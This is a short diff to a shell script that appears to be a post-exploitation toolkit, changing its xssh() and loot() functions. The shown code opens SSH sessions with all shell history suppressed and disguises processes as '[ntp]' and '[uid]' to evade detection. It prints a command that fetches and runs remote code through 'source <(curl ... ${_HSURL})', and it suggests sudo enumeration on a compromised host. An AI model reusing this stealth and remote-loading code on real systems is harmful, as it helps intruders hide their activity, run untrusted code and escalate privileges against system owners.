@@ -153,12 +153,14 @@ xssh() {
             opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"" "-oControlPersist=15")
         }
     }
+    # If we use key then disable Password auth ('-oPasswordAuthentication=no' is not portable)
+    { [[ "$*" == *" -i"* ]] || [[ "$*" == "-i"* ]]; } && opts+=("-oBatchMode=yes")
     echo -e "May need to cut & paste: ' ${CDC}source <(curl -SsfL ${_HSURL})${CN}'"
     stty raw -echo icrnl opost
     \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
         "$@" \
         "unset SSH_CLIENT SSH_CONNECTION; LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color HISTFILE=/dev/null BASH_HISTORY=/dev/null exec -a [ntp] script -qc 'source <(resize 2>/dev/null); exec -a [uid] bash -i' /dev/null"
-    stty "${ttyp}"
+    [ -n "$ttyp" ] && stty "${ttyp}"
 }
 
 xscp() {
@@ -1239,7 +1241,7 @@ loot() {
     }
 
     [ "$UID" -ne 0 ] && {
-        echo -e "${CW}TIP:${CN} Type ${CDC}sudo -ln${CN} to list sudo perms. ${CF}[may log to auth.log]${CN}"
+        echo -e "${CW}TIP:${CN} Type ${CDC}sudo -v${CN} and ${CDC}sudo -ln${CN} to list sudo perms. ${CF}[may log to auth.log]${CN}"
     }
 
     lootlight
